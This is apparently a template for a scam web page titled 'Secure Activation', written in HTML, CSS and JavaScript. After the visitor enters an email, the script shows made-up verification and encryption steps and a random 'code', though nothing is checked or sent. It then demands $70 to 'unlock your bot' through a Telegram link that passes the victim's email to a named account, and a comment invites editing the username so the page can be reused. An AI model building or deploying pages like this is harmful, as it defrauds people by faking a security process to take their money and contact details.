<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Secure Activation</title>

<style>
body {
    margin:0;
    font-family: Arial;
    background:#05070f;
    color:#fff;
    display:flex;
    justify-content:center;
    align-items:center;
    height:100vh;
}

.container {
    background:#0f1629;
    padding:30px;
    border-radius:15px;
    width:360px;
    text-align:center;
    box-shadow:0 0 40px rgba(0,255,204,0.15);
}

/* LOGO */
.logo img {
    width:200px;
    height:auto;
    margin-bottom:15px;
    border-radius:12px;
    box-shadow:0 0 20px rgba(0,255,204,0.5);
}

/* INPUT */
input {
    width:100%;
    padding:12px;
    margin:10px 0;
    border:none;
    border-radius:8px;
    background:#1b2545;
    color:#fff;
}

/* BUTTON */
button {
    width:100%;
    padding:12px;
    border:none;
    border-radius:8px;
    background:#00ffcc;
    color:#000;
    font-weight:bold;
    cursor:pointer;
    box-shadow:0 0 15px rgba(0,255,204,0.6);
}

button:hover {
    box-shadow:0 0 25px rgba(0,255,204,1);
}

/* CODE */
.code {
    font-size:30px;
    color:#00ffcc;
    margin:20px 0;
    text-shadow:0 0 15px rgba(0,255,204,0.8);
}

/* OVERLAY */
.overlay {
    position:fixed;
    top:0;
    left:0;
    width:100%;
    height:100%;
    background:rgba(0,0,0,0.85);
    display:flex;
    justify-content:center;
    align-items:center;
    opacity:0;
    pointer-events:none;
    transition:0.3s;
}

.overlay.active {
    opacity:1;
    pointer-events:auto;
}

/* MODAL */
.modal {
    background:#0f1629;
    padding:25px;
    border-radius:12px;
    width:300px;
    text-align:center;
    box-shadow:0 0 30px rgba(0,255,204,0.2);
}

.amount {
    font-size:28px;
    color:#00ffcc;
    margin:15px 0;
    text-shadow:0 0 10px rgba(0,255,204,0.8);
}
</style>
</head>

<body>

<div class="container">

<!-- LOGO -->
<div class="logo">
    <img src="logo.png" alt="Logo">
</div>

<h2>🔐 Secure Access</h2>

<input type="email" id="email" placeholder="Enter your email">

<button onclick="start()">Continue</button>

<div id="verify" style="display:none;">
<p id="emailShow"></p>
<p id="userShow" style="color:#00ffcc;"></p>

<div class="code" id="code">------</div>
<p id="status">Initializing...</p>
</div>

</div>

<!-- POPUP -->
<div class="overlay" id="overlay">
  <div class="modal">
    <h3>Activate Access</h3>
    <p>Activation required to unlock your bot</p>
    <div class="amount">$70.00</div>

    <a id="tgLink">
      <button>Activate via Telegram</button>
    </a>
  </div>
</div>

<script>
function start() {
    let email = document.getElementById("email").value;
    if(!email) return alert("Enter email");

    let username = email.split("@")[0];

    document.getElementById("verify").style.display = "block";
    document.getElementById("emailShow").innerText = email;
    document.getElementById("userShow").innerText = username;

    let code = Math.floor(100000 + Math.random()*900000);
    document.getElementById("code").innerText = code;

    let steps = [
        "Sending secure code...",
        "Verifying account...",
        "Encrypting session...",
        "Access locked"
    ];

    let i=0;
    let int = setInterval(()=>{
        document.getElementById("status").innerText = steps[i];
        i++;
        if(i===steps.length){
            clearInterval(int);
            setTimeout(()=>{
                document.getElementById("overlay").classList.add("active");

                // TELEGRAM LINK (EDIT USERNAME)
                let tg = "https://t.me/hacyberglobaltech?text="
                + encodeURIComponent("Hello, I completed activation. Email: " + email);

                document.getElementById("tgLink").href = tg;

            },500);
        }
    },1200);
}
</script>

</body>
</html>
